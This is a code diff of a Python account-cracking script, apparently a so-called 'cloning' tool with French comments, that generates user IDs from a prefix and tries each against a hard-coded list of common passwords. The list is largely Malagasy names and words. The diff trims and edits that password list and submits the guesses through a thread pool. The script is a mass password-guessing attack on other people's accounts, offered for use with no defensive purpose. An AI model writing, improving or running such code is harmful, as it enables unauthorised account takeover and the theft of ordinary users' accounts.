@@ -1,8 +1,5 @@
 # Définir le numéro de version
 version_actuelle = "2.0"
-
-
-
 import os
 import random
 import string 
@@ -116,7 +113,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika', 'mendrikarivo', 'mendrikarivo', 'antananarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','bangladesh','nantenaina','Nantenaina','Safidy','safidy','miora','Miora','fuckyou','free fire','Free Fire','analamanga','Analamanga','ayesha','natacha','Natacha','lalaina','Lalaina','diamondra','Diamondra','mamisoa','Mamisoa','tahiana','Tahiana','yousha','mampionona','Mampionona','nomena','Nomena','miangaly','Miangaly']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','mamako', 'malalako', 'mamiko', 'mamako', 'malalako', 'mamiko', 'badoda', 'badoda', 'mendrika', 'mendrika',  'mendrikarivo', 'antananarivo', 'marary', 'marary', 'milely', 'milely','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy','nantenaina','Nantenaina','safidy','miora','Miora','fuckyou','free fire','Free Fire','analamanga','Analamanga','natacha','Natacha','lalaina','Lalaina','diamondra','Diamondra','mamisoa','Mamisoa','mampionona','Mampionona','nomena','Nomena','miangaly','Miangaly']
             Dipto.submit(method_crack,ids,passlist)
     linex()
     print(' LE CLONING EST FINI ')
